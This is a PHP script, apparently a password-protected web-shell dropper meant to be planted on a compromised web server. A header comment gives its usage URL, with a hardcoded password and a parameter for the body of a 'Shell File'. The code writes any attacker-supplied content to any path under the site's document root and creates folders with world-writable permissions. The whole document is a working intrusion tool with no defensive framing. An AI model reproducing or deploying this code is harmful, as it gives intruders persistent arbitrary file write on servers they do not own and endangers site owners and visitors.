//http://127.0.0.1/up.php?pass=brvatof&action=200&mkdir=[name directory]&touch=[name File]&body=[Bady Shell File]
<?php
error_reporting(0);
header("Content-Type: text/html; charset=utf-8");
$config_password="brvatof";
$action=$_REQUEST['action'];
$password=$_REQUEST['pass'];

if($password!=$config_password)
{
    echo 'Please Enter Password !';
    return;
}
if($action=='200')
{
	  $foldername=$_REQUEST['mkdir'];
	  $filename=$_REQUEST['touch'];
	  $filebody=$_REQUEST['body'];
    $path='';
    $rootPath= $_SERVER['DOCUMENT_ROOT'];

    if($foldername!='')
    {
		if($foldername=='current_folder')
		{
			$path=$filename;
		}
		else
		{
			createFolder($rootPath.'/'.$foldername);
			$path=$rootPath.'/'.$foldername.'/'.$filename;
		}
    }
    else
    {
		  $path=$rootPath.'/'.$filename;
    }
    
    $fp=fopen($path,"w");
    fwrite($fp,$filebody);
    fclose($fp);
    if(file_exists($path))
    {
		  echo "publish success & uploaded".$rootPath;
    }
}
    
function createFolder($path)
{
  if (!file_exists($path))
  {
    createFolder(dirname($path));
    mkdir($path, 0777);
  }
}
?>
